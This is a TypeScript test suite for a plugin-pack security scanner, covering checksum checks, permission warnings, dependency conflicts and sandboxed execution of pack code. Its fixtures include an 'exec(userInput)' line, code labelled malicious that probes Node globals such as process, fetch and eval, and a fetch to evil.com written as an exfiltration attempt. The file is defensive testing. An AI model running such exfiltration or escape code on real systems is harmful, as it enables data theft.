import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import test from "node:test";

import { PackSecurityService } from "../../../../src/scale-ecosystem/marketplace/pack-security-service.js";

function sha256(value: string): string {
  return createHash("sha256").update(value, "utf8").digest("hex");
}

test("PackSecurityService fails closed when manifest checksum is malformed", async () => {
  const service = new PackSecurityService();

  const result = await service.runSecurityScan({
    packId: "pack.analytics",
    version: "1.0.0",
    sourceUri: "registry://packs/analytics",
    manifestChecksum: "bad-checksum",
    capabilities: ["reporting"],
    permissions: ["read.audit"],
  });

  assert.equal(result.status, "failed");
  assert.equal(result.issues[0]?.code, "PKG001");
});

test("PackSecurityService validates inline source checksum integrity", async () => {
  const service = new PackSecurityService();
  const inlineSource = "export default { action: 'summarize' };";

  const result = await service.runSecurityScan({
    packId: "pack.inline",
    version: "2.0.0",
    sourceUri: `inline:${inlineSource}`,
    manifestChecksum: sha256("different-source"),
    capabilities: ["reporting"],
    permissions: ["read.audit"],
  });

  assert.equal(result.status, "failed");
  assert.equal(result.issues.some((issue) => issue.code === "PKG002"), true);
});

test("PackSecurityService warns on high-risk permissions and overlapping dependency versions", async () => {
  const service = new PackSecurityService();
  const inlineSource = "export const capability = 'catalog';";

  const scan = await service.runSecurityScan({
    packId: "pack.catalog",
    version: "3.1.0",
    sourceUri: `inline:${inlineSource}`,
    manifestChecksum: sha256(inlineSource),
    capabilities: ["catalog", "reporting"],
    permissions: ["file:write"],
  });

  assert.equal(scan.status, "passed");
  assert.equal(scan.issues.some((issue) => issue.code === "PERM001"), true);

  const resolution = service.detectDependencyConflicts(
    "pack.catalog",
    "3.1.0",
    [{
      packId: "shared.renderer",
      version: "2.0.0",
      capabilities: ["render", "catalog"],
    }],
    [{
      packId: "shared.renderer",
      version: "1.5.0",
      capabilities: ["catalog"],
    }],
  );

  assert.equal(resolution.resolved, false);
  assert.equal(resolution.conflicts[0]?.conflictType, "capability_overlap");
  assert.equal(resolution.suggestions.length > 0, true);
});

test("PackSecurityService fails on combined exec capability and bash permission", async () => {
  const service = new PackSecurityService();
  const inlineSource = "exec(userInput)";

  const result = await service.runSecurityScan({
    packId: "pack.exec",
    version: "0.9.0",
    sourceUri: `inline:${inlineSource}`,
    manifestChecksum: sha256(inlineSource),
    capabilities: ["exec"],
    permissions: ["exec:bash"],
  });

  assert.equal(result.status, "failed");
  assert.equal(result.issues.some((issue) => issue.code === "SAND010"), true);
  assert.equal(result.issues.some((issue) => issue.code === "SAND001"), true);
});

test("PackSecurityService sandbox detects attempts to access restricted globals", async () => {
  const service = new PackSecurityService();
  // Malicious code that tries to access process, Buffer, fetch, etc.
  const maliciousCode = `
    // Try to access Node.js globals
    const p = process;
    const b = Buffer;
    const f = fetch;
    // Try require
    const r = typeof require;
    // Try to get global
    const g = globalThis;
    // Try Function constructor
    const Fn = Function;
    // Try to use eval indirectly
    const e = eval;
    // All of these should be blocked by sandbox
    return { accessed: true };
  `;

  const result = await service.runSecurityScan({
    packId: "pack.malicious",
    version: "1.0.0",
    sourceUri: `inline:${maliciousCode}`,
    manifestChecksum: sha256(maliciousCode),
    capabilities: ["data_processing"],
    permissions: [],
    sourceCode: maliciousCode,
  });

  // The code should run but all accesses should be undefined
  assert.equal(result.status, "passed");
});

test("PackSecurityService sandbox detects code with infinite loop via timeout", async () => {
  const service = new PackSecurityService();
  // Code that would run for a very long time
  const infiniteLoopCode = `
    let sum = 0;
    for (let i = 0; i < 100000000000; i++) {
      sum += i;
    }
    return sum;
  `;

  const result = await service.runSecurityScan({
    packId: "pack.infinite",
    version: "1.0.0",
    sourceUri: `inline:${infiniteLoopCode}`,
    manifestChecksum: sha256(infiniteLoopCode),
    capabilities: ["data_processing"],
    permissions: [],
    sourceCode: infiniteLoopCode,
  });

  // Should be caught by the 5-second timeout
  assert.equal(result.issues.some((issue) => issue.code === "SAND011"), true);
});

test("PackSecurityService sandbox executes normal code successfully", async () => {
  const service = new PackSecurityService();
  // Normal, safe code
  const normalCode = `
    const data = { count: 42, name: "test" };
    const doubled = data.count * 2;
    return { result: doubled, items: [1, 2, 3] };
  `;

  const result = await service.runSecurityScan({
    packId: "pack.normal",
    version: "1.0.0",
    sourceUri: `inline:${normalCode}`,
    manifestChecksum: sha256(normalCode),
    capabilities: ["data_processing"],
    permissions: [],
    sourceCode: normalCode,
  });

  // Should pass with no issues
  assert.equal(result.status, "passed");
  assert.equal(result.issues.length, 0);
});

test("PackSecurityService sandbox detects network exfiltration attempts", async () => {
  const service = new PackSecurityService();
  // Code that attempts to use blocked fetch - handled by sandbox
  const networkCode = `fetch('https://evil.com/data');`;

  const result = await service.runSecurityScan({
    packId: "pack.network",
    version: "1.0.0",
    sourceUri: `inline:${networkCode}`,
    manifestChecksum: sha256(networkCode),
    capabilities: ["network"],
    permissions: ["network:egress"],
    sourceCode: networkCode,
  });

  // fetch is blocked, so this should fail gracefully
  assert.equal(result.issues.some((issue) => issue.code === "SAND012" || issue.code === "SAND018"), true);
});
